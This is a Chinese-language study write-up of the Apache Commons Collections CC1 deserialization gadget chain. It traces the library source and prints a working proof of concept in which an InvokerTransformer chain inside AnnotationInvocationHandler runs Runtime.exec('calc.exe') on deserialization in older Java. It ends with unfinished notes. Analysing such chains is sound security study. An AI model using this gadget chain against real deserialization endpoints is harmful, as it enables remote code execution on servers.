### CC链的介绍

>   Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合工具类。
>
> 作为Apache开源项⽬的重要组件，Commons Collections被⼴泛应⽤于各种Java应⽤的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。
>
> Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer。

* 简单来说就是利用org.apache.commons.collections中的各种类构成的序列化对象,实现序列化漏洞的利用.由于该库中的各种类极其丰富,有不止一种链条来引发反序列化漏洞.

### P牛的CommonCollections1分析

#### 代码分析

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };

        Transformer transformerChain = new
                ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

```java
//  Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
// 对innerMap进行修饰,当返回对象outerMap put(null,value)时,调用了transformerChain.transform(value)
// 实际上可以看到put内`key = transformKey(key);value = transformValue(value);`实际上调用的类和方法是相同的
// 所以，TransformedMap.decorate(innerMap, transformerChain, null);同样可以触发漏洞
public static Map decorate(Map map, Transformer keyTransformer, Transformer 10valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}

public Object put(Object key, Object value) {
    key = transformKey(key);
    value = transformValue(value);  
    return getMap().put(key, value);
}

protected Object transformKey(Object object) {
    if (keyTransformer == null) {
        return object;  
    }
    return keyTransformer.transform(object);
}

protected Object transformValue(Object object) {
    if (valueTransformer == null) {
        return object;
    }
    return valueTransformer.transform(object);
}
```

```java
// 来到了transformerChain.transform(value)
// Transformer transformerChain = new ChainedTransformer(transformers);
// transformerChain.transform(value)遍历调用了数组transformers中的元素的方法transform
public class ChainedTransformer implements Transformer, Serializable {
    // ......
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
    // Transformer是一个接口,只有一个待实现的方法transform
    public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
    // ......
}
```

```java
// 再来到数组transformers
/* Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };*/
// new ConstantTransformer(Runtime.getRuntime())
public class ConstantTransformer implements Transformer, Serializable {
    // ...
     public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }
    public Object transform(Object input) {
        return iConstant;
    }
    // ...
}
// new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
public class InvokerTransformer implements Transformer, Serializable {
    // ...
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
    // ...
}
```

```java
// 所以key="test";transformerChain.transform(value)实际上执行了什么
// transformers[0].transform("test")
object = (Object) Runtime.getRuntime();

// transformers[1].transform(object)
Class cls = object.getClass();
Method method = cls.getMethod("exec", new Class[]{String.class});
method.invoke(object, new Object[]{"calc.exe"});
```

#### 不是真正POC的原因

先前例子中,我们手工执行outerMap.put("test", "xxxx")触发了反序列化漏洞,但是在正常的反序列化漏洞利用场景中,序列化对象只是一个类,即:

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]
                        {"calc.exe"}),
};

Transformer transformerChain = new
        ChainedTransformer(transformers);

Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null,
        transformerChain);

// 序列化对象
try (FileOutputStream fos = new FileOutputStream("outerMap.ser");
             ObjectOutputStream oos = new ObjectOutputStream(fos)) {
    oos.writeObject(outerMap);
    System.out.println("Person 对象已经被序列化到 outerMap.ser 文件");
} catch (IOException e) {
    e.printStackTrace();
}
```

此时,我们虽然得到了outerMap的序列化对象,但是当其被反序列化时,如果readObject方法中没有进行outerMap.put或者它调用transformerChain.transform(key)的操作,其也不可能触发反序列化漏洞

### 8u71前的CommonCollections1

先把最终的poc代码展示一下

```java
public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new
                        Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new
                        Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {
                                "calc.exe" }),
        };

        Transformer transformerChain = new
                ChainedTransformer(transformers);

        Map innerMap = new HashMap();

        // new
        innerMap.put("value", "xxxx");
        // new

        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);

        // delete
        // outerMap.put("test", "xxxx");
        // delete

        // new
        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Object obj = construct.newInstance(Retention.class, outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();
    }
}
```

前文的例子中的序列化对象缺少一个outerMap.put来触发漏洞，自然地，我们继续地去寻找类，在其readObject中能够进行outerMap.put操作，这个类就sun.reflect.annotation.AnnotationInvocationHandler，注意这个类是Java的内部实现类，位于sun.reflect.annotation包下，所以它在Java的不同版本下实现可能是不同的，所以现在使用到AnnotationInvocationHandler的这条链只能在java8u71之前触发漏洞。

看一下AnnotationInvocationHandler的readobject方法

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

这里就直接指出触发关键所在了，即 `memberValue.setValue`，`memberValue`是该`AnnotationInvocationHandler`的属性`memberValues`的元素，让我们看看这个属性的具体情况

```java
private final Map<String, Object> memberValues;

AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
    Class<?>[] superInterfaces = type.getInterfaces();
    if (!type.isAnnotation() ||
        superInterfaces.length != 1 ||
        superInterfaces[0] != java.lang.annotation.Annotation.class)
        throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
    this.type = type;
    this.memberValues = memberValues;
}
```

`memeberVakues`是Map类型，在new`AnnotationInvocationHandler`时，传入一个`Map<String, Object>`类型的参数即可给这个属性赋值，自然地联想到我们之前相反序列化的对象也是Map的子类，它是否可以通过setValue触发我们所希望的敏感操作呢？

我们最后获取的对象是TransformedMap类型，他没有重写setValue方法，我们向它的父类追溯，它的父类`AbstractInputCheckedMapDecorator`也没有重写该方法，但是定义了一个内部类，有这个方法

```java
static class MapEntry extends AbstractMapEntryDecorator {

        /** The parent map */
        private final AbstractInputCheckedMapDecorator parent;

        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }

        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }
```

让我们回顾TransformedMap的checkSetValue方法，再回顾之前的内容，可以发现`valueTransformer.transform(value)`是可以触发漏洞的。

```java
protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

问题是，单看`memberValue.setValue`，它调用的不可能是`MapEntry`的setValue，但如果运行上面给出的poc，打下断点，会发现这个方法确实被调用了，至于具体原因我们随后分析。那我们总结下现在可以写出poc代码。

```java
public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };

        Transformer transformerChain = new
                ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        // new
        innerMap.put("value", "xxxx");
        // new
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
    
        Class clazz =
                    Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
            construct.setAccessible(true);
            Object obj = construct.newInstance(Retention.class, outerMap);
    }
```

这里还需解释一下两点，1.删除了`outerMap.put`，添加了`innerMap.put("value", "xxxx")`，这个后续再做解释；2.对于`AnnotationInvocationHandler`的获取采取的是反射的方式，而不是直接new，这是因为该类为default。



* 继续文章
* 分析特殊情况下调用setValue的原因，为什么要设置特定的key和value，这里的inner.put作用

* 对于TransformedMap类设计上的理解

